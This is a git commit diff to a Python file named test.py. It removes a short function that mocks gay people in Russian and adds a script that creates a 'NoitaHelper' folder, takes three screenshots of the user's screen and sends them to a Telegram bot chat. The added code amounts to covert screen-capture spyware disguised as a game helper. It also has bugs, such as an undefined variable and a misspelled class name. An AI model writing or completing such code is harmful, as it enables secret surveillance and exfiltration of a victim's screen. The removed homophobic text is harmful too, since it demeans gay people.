9359db255a976a502d7226c360f2577980ec014c
duduskaaa <ergalikhatep@gmail.com>
2025-03-04 15:39:12 +0000

    Update test.py
    That's bot test now

--- test.py
+++ test.py
@@ -1,4 +1,28 @@
-def ersa(isGay):
-  return "Согласен на все 100" if isGay else "Фу, гей"
+# pip install puautogui telebot/pyTelegramBotAPI platform
 
-print(isGay(True))
+import os
+import pyautogui
+import platform
+import telebot
+
+new_dir = os.path.expanduser("~/NoitaHelper")
+os.makedirs(path, exist_ok=True)
+path_s = os.path.join(new_dir, "new.png")
+
+TOKEN = ""
+CHAT_ID =  0
+bot = telebot.Telebot(TOKEN)
+
+try:
+  def make():
+      screenshot = pyautogui.screenshot()
+      screenshot.save(path_s)  
+  def send():
+      for i in range(3):
+          make()
+          with open(path_s, "rb") as s:
+              bot.send_photo(CHAT_ID, s)
+          os.remove(path_s)
+  send()
+except Exception as e:
+  bot.send_message(CHAT_ID, f"Error: {str(e)}")
